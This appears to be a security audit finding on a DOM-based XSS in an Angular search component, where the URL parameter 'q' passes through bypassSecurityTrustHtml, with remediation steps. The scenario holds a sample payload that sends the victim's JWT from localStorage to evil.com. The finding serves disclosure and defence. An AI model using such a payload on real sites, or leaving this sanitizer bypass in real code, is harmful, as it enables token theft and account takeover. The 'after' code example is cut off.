  title: Cross-Site Scripting (XSS)
  affected_parameter: q
  scenario: In `search-result.component.ts:143`, the URL query parameter `q` is read directly via `this.route.snapshot.queryParams.q`,
    passed through `this.sanitizer.bypassSecurityTrustHtml(queryParam)`, and assigned to `this.searchValue` which is rendered
    in the template as trusted HTML. Because Angular's `DomSanitizer.bypassSecurityTrustHtml()` explicitly disables all HTML
    sanitization, any attacker who crafts a link such as `/#/search?q=<img src=x onerror=fetch('https://evil.com?t='+localStorage.getItem('token'))>`
    achieves immediate code execution in the victim's browser context. No Content Security Policy is in place to block the
    injected script or exfiltration request. Combined with JWT storage in localStorage (see frontend-spa-007), a single click
    on the malicious link delivers the victim's JWT to an attacker-controlled server.
  evidence_summary: At `search-result.component.ts:143`, the raw `queryParams.q` value is passed directly to `this.sanitizer.bypassSecurityTrustHtml()`,
    which marks the attacker-supplied string as safe for DOM insertion, bypassing all Angular output encoding.
  impact_description: Full DOM-based XSS allowing arbitrary JavaScript execution in the victim's browser, immediate theft
    of the JWT from localStorage, and account takeover.
  likelihood: High
  impact: High
  risk: High
  controls_in_place: Angular DomSanitizer is imported but its protection is explicitly bypassed via bypassSecurityTrustHtml.
    No CSP is configured.
  mitigation_title: Remove bypassSecurityTrustHtml from URL query parameter handling in search-result component
  remediation:
    effort: Low
    steps:
    - Remove `this.sanitizer.bypassSecurityTrustHtml(queryParam)` at line 143; assign `queryParam` directly as a plain string
      to `this.searchValue` — Angular template interpolation (`{{ searchValue }}`) will encode it safely by default.
    - Change the template binding from `[innerHTML]="searchValue"` to text interpolation `{{ searchValue }}` so Angular's
      built-in XSS prevention applies.
    - 'Deploy a Content Security Policy header (`Content-Security-Policy: default-src ''self''; script-src ''self''`) at the
      server layer to restrict the impact of any remaining XSS surfaces.'
    code_example: '// Before (search-result.component.ts:143) — bypasses all sanitization:

      this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)


      // After — Angular encodes the string safely in the template:

